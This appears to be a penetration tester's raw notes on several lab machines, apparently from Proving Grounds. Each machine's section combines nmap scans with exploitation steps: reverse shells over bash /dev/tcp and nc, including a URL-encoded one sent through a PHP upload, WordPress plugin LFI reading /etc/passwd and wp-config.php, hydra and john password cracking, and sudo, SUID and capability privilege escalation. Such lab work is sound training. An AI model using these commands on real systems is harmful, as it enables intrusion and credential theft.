933.95 seconds<br /><br /><br /><br /><br /><br /><br /><br /><strong>users</strong><br />ganimedes<br />dawn<br /><br /><strong>upload web-control to smb as seen in logs it is run periodically</strong><br />#!/usr/bin/bash<br />bash -i &gt;&amp; /dev/tcp/192.168.221.11/6666 0&gt;&amp;1 <br /><br /><br /></div><div class='page'><h1 class='title level-2'>btrsys.pg</h1><br/>PORT   STATE SERVICE REASON         VERSION<br />21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3<br />|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to ::ffff:192.168.49.139<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 2<br />|      vsFTPd 3.0.3 - secure, fast, stable<br />|_End of status<br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKrYYWK3Xv2EBb0KryPAargHdeVdVuGj+AHTUbH1CyLIuQ3zbtaq2+lr5K/aMqiJ5othz27+RWSJ2NmQ2JeOUBCogFLikCwU6MRDQLHpV+neS3fAKrH5fNnXo+RfnMWBLQaaXBPiUOQaoQc27hRN3SJ1hbVLEF65TY0siTrOj0Lt8SRztwkbfynHEKxMsQi5WWDLTgS7bivCf9VVWwqgmuBbsJAqFExDjLxlxJpH4+93bgEtD9EPV/KKO9B3Inaz8PxC+zXZofhZXloysYoGg4IZzT55JzrRVRuv/cbGcMuGTBpCCkdH01G4NCSgL7YwX13C1Qc+EFX1QExV6k1ePD<br />|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFTsqff4O0hsl+RUR2lXFcbCEkvFcspHALA2RR2DpoD2AlRN/DEpIbW3NETNXxxyKHTtGhUiBSUuw8S9RSBAsnY=<br />|   256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH91w++CdkbeAkmXYietVhD/73nEaXR/nbeBEyuwLwgq<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))<br />| http-methods: <br />|_  Supported Methods: GET HEAD POST OPTIONS<br />| http-robots.txt: 1 disallowed entry <br />|_Hackers<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br />Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 3.16 (94%), Linux 4.4 (94%), Linux 3.13 (92%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%)<br />No exact OS matches for host (test conditions non-ideal).<br />TCP/IP fingerprint:<br />SCAN(V=7.91%E=4%D=9/13%OT=21%CT=%CU=32715%PV=Y%DS=2%DC=T%G=N%TM=613F93DC%P=x86_64-pc-linux-gnu)<br />SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=8)<br />SEQ(SP=F7%GCD=1%ISR=10B%TI=Z%TS=8)<br />OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)<br />WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)<br />ECN(R=Y%DF=Y%T=40%W=7210%O=M506NNSNW7%CC=Y%Q=)<br />T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />T2(R=N)<br />T3(R=N)<br />T4(R=N)<br />T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)<br />IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Uptime guess: 198.841 days (since Sat Feb 27 00:58:46 2021)<br />Network Distance: 2 hops<br />TCP Sequence Prediction: Difficulty=247 (Good luck!)<br />IP ID Sequence Generation: All zeros<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 21/tcp)<br />HOP RTT       ADDRESS<br />1   140.35 ms 192.168.49.1<br />2   141.07 ms 192.168.139.50<br /><br /><br />view-source:<a href="http://192.168.139.50/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2">http://192.168.139.50/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/</a>etc/passwd<br /><br /><br />http://192.168.56.101/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php<br /><br />wp-admin<br />admin<br />admin<br /><br /><br />export TERM=xterm<br /><br />python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;<br /><br />connect to mysql<br />use wordpress;<br />mysql&gt; select * from wp_users;<br /><br />crack hashes<br /><br />btrisk:roottoor<br />sudo -l<br /><br />sudo su<br /></div><div class='page'><h1 class='title level-2'>photographer.pg</h1><br/><br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-20 22:14 +03<br />Stats: 0:05:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 35.87% done; ETC: 22:31 (0:10:40 remaining)<br />Nmap scan report for 192.168.74.76<br />Host is up (0.15s latency).<br />Not shown: 65530 closed ports<br />PORT     STATE SERVICE     VERSION<br />22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f (RSA)<br />|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 (ECDSA)<br />|_  256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 (ED25519)<br />80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Photographer by v1n1v131r4<br />139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br />8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))<br />|_http-generator: Koken 0.22.24<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: daisa ahomi<br />|_http-trane-info: Problem with XML parsing of /evox/about<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/20%OT=22%CT=1%CU=41658%PV=Y%DS=2%DC=T%G=Y%TM=60A6B93<br />OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%TS=A)OPS(O1=M506ST<br />OS:11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M5<br />OS:06ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%<br />OS:T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=<br />OS:N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G<br />OS:)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s<br />|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br />|   Computer name: photographer<br />|   NetBIOS computer name: PHOTOGRAPHER\x00<br />|   Domain name: \x00<br />|   FQDN: photographer<br />|_  System time: 2021-05-20T15:32:04-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2021-05-20T19:32:02<br />|_  start_date: N/A<br /><br />TRACEROUTE (using port 5900/tcp)<br />HOP RTT       ADDRESS<br />1   155.43 ms 192.168.49.1<br />2   156.17 ms 192.168.74.76<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1065.51 seconds<br /><br /><br /><br /><br /><a href="http://192.168.74.76:8000/storage/originals/f7/19/koken.php?cmd=%72%6D%20%2F%74%6D%70%2F%66%3B%6D%6B%66%69%66%6F%20%2F%74%6D%70%2F%66%3B%63%61%74%20%2F%74%6D%70%2F%66%7C%2F%62%69%6E%2F%73%68%20%2D%69%20%32%3E%26%31%7C%6E%63%20%31%39%32%2E%31%36%38%2E%34%39%2E%37%34%20%36%36%36%36%20%3E%2F%74%6D%70%2F%66">http://192.168.74.76:8000/storage/originals/f7/19/koken.php?cmd=%72%6D%20%2F%74%6D%70%2F%66%3B%6D%6B%66%69%66%6F%20%2F%74%6D%70%2F%66%3B%63%61%74%20%2F%74%6D%70%2F%66%7C%2F%62%69%6E%2F%73%68%20%2D%69%20%32%3E%26%31%7C%6E%63%20%31%39%32%2E%31%36%38%2E%34%39%2E%37%34%20%36%36%36%36%20%3E%2F%74%6D%70%2F%66</a><br /><br /><br />linpeas.sh<br /><br />php7.2 SGUID<br /><br />CMD=&quot;/bin/bash&quot;<br />/usr/bin/php7.2 -r &quot;pcntl_exec(&#39;/bin/bash&#39;, [&#39;-p&#39;]);&quot;<br /> whoami<br /> root</div><div class='page'><h1 class='title level-2'>SoSimple.pg</h1><br/>PORT   STATE SERVICE REASON         VERSION                                                                                    <br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)                               │                                                                                                                              <br />| ssh-hostkey:                                                                                                            <br />|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)                                                                 │└─#                                                                                                                       1 ⨯<br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZJ+y+c4YDmXPBY8hytP7uA0bmTKJfUnWpZn1744GxKheNmQqG98tALhL+Hz4OxWRhLzoGa/klypcYMEstzpopx│<br />ZvLIUil5PPfrCTW+dwCixiULgi8Q9ImfBgKNYaQ6aog7qXG0N0GUazyJj/O2Sfx8qc32cvgh27SOOfiIvZ3s3xeh1DOqjC1kEkzJG9YeMRKRc0AC2TCtRmGbvBGL3iK│<br />jjuLS+lXxgtNEnjGI3m+n7RwgMDe0iv82ThCc1oRjeTEysstm4baIJvsdRs/trfvV/2cfAAfl77B0p6HS3rPWZYj2WCoSyG6Z3bK+kjjt+FG5V+zhQ8G4yntT/brCIX│<br />Ga0iSe1vGrLk6dIrRsmbPsG3V3dkggyOL/aWkL6Q2bnb3suFINJ98Hvjd9Pe3ngsnv5iefgRaHwu/GgP7sVpLsKGdvo2smS7PTmHrZFqP74SeGC+TQ2BIhxYe9uAoL5│<br />NRappcCyA0ZF3kB9907nSggM/1bZ2uXnWqzKwPD5dBvTM=                                                                                 │<br />|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)                                                                │<br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO/ko3XtMH5m6keCi750yCg/B93iEWSBbyGrmJZ4sHThaowuRlW6s│<br />m/WuHR6AUeoCsU0su07XVlgPtCJOf35ByU=                                                                                            │<br />|   256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)                                                              │<br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKkLRPLyIQqo5WToErae3vTYq6M2ZYupOFtsl1oNG0rp                                             │<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))                                                             │<br />| http-methods:                                                                                                                │<br />|_  Supported Methods: POST OPTIONS HEAD GET                                                                                   │<br />|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                   │<br />|_http-title: So Simple           <br /><br /><br />wpscan -e<br />max<br /><br />bruteforce passwd with rockyou<br /><br />max:opensesame<br /><br />credentials arent useful<br /><br />social warfare exploit 3.5.0 wordpress plugin<br /><br />wp-config.php db password<br />wp_user:password<br /><br />mysql localhost<br /><br />admin:$P$BqOIi8a7Jtcidgsi9y9WXw9UIfqD4q1<br />max:$P$BfDfIwyVLEQAVBrDn/ox9qT6uzgwwZ1<br /><br />/home/max/.ssh/id_rsa<br /><br />User max may run the following commands on so-simple:<br />    (steven) NOPASSWD: /usr/sbin/service<br /><br /><code>/usr/sbin/service ../../bin/sh</code><br /><br />sudo -u steven /usr/sbin/service ../../bin/bash<br /><br />User steven may run the following commands on so-simple:<br />    (root) NOPASSWD: /opt/tools/server-health.sh<br /><br />create tools dir under opt<br /><br />create file service-health.sh<br /><br />GIVE IT EXECUTE PERMISSON OTHERWISE DOES NOT WORK!<br /><br />#!/bin/bash<br />/bin/bash -p<br /><br />sudo /opt/tools/server-health.sh<br /><br />root@so-simple:/# <br /><br /><br /></div><div class='page'><h1 class='title level-2'>vegeta1.pg</h1><br/>PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)<br />|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)<br />|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/22%OT=22%CT=1%CU=32357%PV=Y%DS=2%DC=T%G=Y%TM=60A831F<br />OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M506ST<br />OS:11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M5<br />OS:06ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%<br />OS:T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=<br />OS:N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G<br />OS:)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 199/tcp)<br />HOP RTT       ADDRESS<br />1   149.83 ms 192.168.49.1<br />2   149.92 ms 192.168.233.73<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1072.12 seconds<br /><br />find_me.html qr code is a rabbit hole<br /><br />/bulma ⇒ you have to manually find it by searching through dragonball characters<br /><br />hahahah.wav ⇒ morse code decoder USER TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)<br /><br />trunks:u$3r<br /><br />writable /etc/passwd<br /><br />root<br /><br /></div><div class='page'><h1 class='title level-2'>potato.pg</h1><br/>─# nmap -A -p- 192.168.74.101<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-20 22:55 +03<br />Stats: 0:06:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 41.31% done; ETC: 23:11 (0:09:08 remaining)<br />Stats: 0:07:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 50.52% done; ETC: 23:11 (0:07:41 remaining)<br />Stats: 0:08:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 55.76% done; ETC: 23:11 (0:06:55 remaining)<br />Stats: 0:10:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 67.96% done; ETC: 23:11 (0:04:59 remaining)<br />Stats: 0:12:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 81.27% done; ETC: 23:11 (0:02:54 remaining)<br />Stats: 0:13:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 84.05% done; ETC: 23:11 (0:02:29 remaining)<br />Stats: 0:16:28 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute<br />Traceroute Timing: About 32.26% done; ETC: 23:12 (0:00:00 remaining)<br />Stats: 0:16:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br />NSE Timing: About 99.51% done; ETC: 23:12 (0:00:00 remaining)<br />Nmap scan report for 192.168.74.101<br />Host is up (0.15s latency).<br />Not shown: 65532 closed ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)<br />|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)<br />|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)<br />80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br />|_http-server-header: Apache/2.4.41 (Ubuntu)<br />|_http-title: Potato company<br />2112/tcp open  ftp     ProFTPD<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak<br />|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/20%OT=22%CT=1%CU=41306%PV=Y%DS=2%DC=T%G=Y%TM=60A6C29<br />OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M506ST<br />OS:11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M5<br />OS:06ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%<br />OS:T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)<br />OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=<br />OS:N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=<br />OS:G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 143/tcp)<br />HOP RTT       ADDRESS<br />1   149.40 ms 192.168.49.1<br />2   149.49 ms 192.168.74.101<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 994.47 seconds<br /><br />└─# ftp 192.168.74.101 2112<br />Connected to 192.168.74.101.<br />220 ProFTPD Server (Debian) [::ffff:192.168.74.101]<br />Name (192.168.74.101:kali): anonymous<br />331 Anonymous login ok, send your complete email address as your password<br />Password:<br />230-Welcome, archive user anonymous@192.168.49.74 !<br />230-<br />230-The local time is: Thu May 20 20:14:54 2021<br />230-<br />230 Anonymous access granted, restrictions apply<br />Remote system type is UNIX.<br />Using binary mode to transfer files.<br />ftp&gt; dir<br />200 PORT command successful<br />150 Opening ASCII mode data connection for file list<br />-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak<br />-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg<br />226 Transfer complete<br />ftp&gt; exit<br />221 Goodbye.<br /><br /><br /><br /><a href="http://192.168.74.101/admin/">http://192.168.74.101/admin/</a><br /><br /> if (strcmp($_POST[&#39;username&#39;], &quot;admin&quot;) == 0  &amp;&amp; strcmp($_POST[&#39;password&#39;], $pass) == 0) {<br /><br /><br /><br /><a href="https://www.infosecarticles.com/content/images/2020/09/exploit-1.png"><img src="images/35-1.png" alt="images/35-1.png" /></a><br /><br /><br /><a href="https://www.infosecarticles.com/content/images/2020/09/burp.png"><img src="images/35-2.png" alt="images/35-2.png" /></a><br /><br /><br /><br /><strong>LFI Logs page</strong><br /><br />└─# john --wordlist=/usr/share/wordlists/rockyou.txt potato.txt      <br />Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;<br />Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])<br />Will run 4 OpenMP threads<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />dragon           (webadmin)<br /><br /><br /><strong>Priv Esc</strong><br />webadmin@serv:/etc$ sudo -l<br />Matching Defaults entries for webadmin on serv:<br />    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br /><br /><strong>User webadmin may run the following commands on serv:<br />    (ALL : ALL) /bin/nice /notes/*</strong><br />    <br />webadmin@serv:/etc$ cd /tmp<br />webadmin@serv:/tmp$ vim test<br />webadmin@serv:/tmp$ chmod +x test<br /><br />echo /bin/bash &gt; test<br /><br />webadmin@serv:/tmp$ <strong>sudo /bin/nice /notes/../tmp/test</strong><br /></div><div class='page'><h1 class='title level-2'>Katana.pg</h1><br/><br />└─# nmap -A -p- 192.168.223.83<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-19 01:48 +03<br />Stats: 0:11:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 76.01% done; ETC: 02:03 (0:03:30 remaining)<br />Nmap scan report for 192.168.223.83<br />Host is up (0.15s latency).<br />Not shown: 65529 closed ports<br />PORT     STATE SERVICE       VERSION<br />21/tcp   open  ftp           vsftpd 3.0.3<br />22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)<br />|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)<br />|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)<br />80/tcp   open  http          Apache httpd 2.4.38 ((Debian))<br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Katana X<br />7080/tcp open  ssl/empowerid LiteSpeed<br />|_http-server-header: LiteSpeed<br />|_http-title: Did not follow redirect to <a href="https://192.168.223.83:7080/">https://192.168.223.83:7080/</a><br />| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US<br />| Not valid before: 2020-05-11T13:57:36<br />|_Not valid after:  2022-05-11T13:57:36<br />|_ssl-date: 2021-05-18T23:04:03+00:00; 0s from scanner time.<br />| tls-alpn: <br />|   h2<br />|   spdy/3<br />|   spdy/2<br />|_  http/1.1<br />8088/tcp open  http          LiteSpeed httpd<br />|_http-server-header: LiteSpeed<br />|_http-title: Katana X<br />8715/tcp open  http          nginx 1.14.2<br />| http-auth: <br />| HTTP/1.1 401 Unauthorized\x0D<br />|_  Basic realm=Restricted Content<br />|_http-server-header: nginx/1.14.2<br />|_http-title: 401 Authorization Required<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/19%OT=21%CT=1%CU=35722%PV=Y%DS=2%DC=T%G=Y%TM=60A447E<br />OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%TS=A)SEQ(SP=103%GC<br />OS:D=1%ISR=10E%TI=Z%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT1<br />OS:1NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE<br />OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=<br />OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y<br />OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16<br />OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 1720/tcp)<br />HOP RTT       ADDRESS<br />1   146.63 ms 192.168.49.1<br />2   145.86 ms 192.168.223.83<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 934.32 seconds<br /><br /><br /><br /><br /><a href="http://192.168.223.83:8088/upload.html">http://192.168.223.83:8088/upload.html</a><br /><br /><br />reha.php<br /><br /><br />&lt;?php<br />exec(&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/192.168.49.223/7777 0&gt;&amp;1&#39;&quot;);<br /><br /><br /><a href="http://192.168.223.83:8715/katana_reha.php">http://192.168.223.83:8715/katana_reha.php</a><br /><br /><br /><br /><br /><br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 -f 192.168.223.83 http-get /protected<br /><br /><br />getcap -r / 2&gt;/dev/null<br /><br />or<br /><br />linpeas.sh<br /><br />/usr/bin/python2.7 = <strong>cap_setuid</strong>+ep<br /><br />python -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</div><div class='page'><h1 class='title level-2'>Wombo.pg</h1><br/>PORT      STATE  SERVICE    VERSION                                                                                                  <br />22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)                                                            <br />| ssh-hostkey:                                                                                                                       <br />|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)                                                                       <br />|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)                                                                      <br />|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)                                                                    <br />53/tcp    closed domain                                                                                                              <br />80/tcp    open   http       nginx 1.10.3                                                                                             <br />|_http-server-header: nginx/1.10.3                                                                                                   <br />|_http-title: Welcome to nginx!                                                                                                      <br />6379/tcp  open   redis      Redis key-value store 5.0.9                                                                              <br />8080/tcp  open   http-proxy                                                                                                          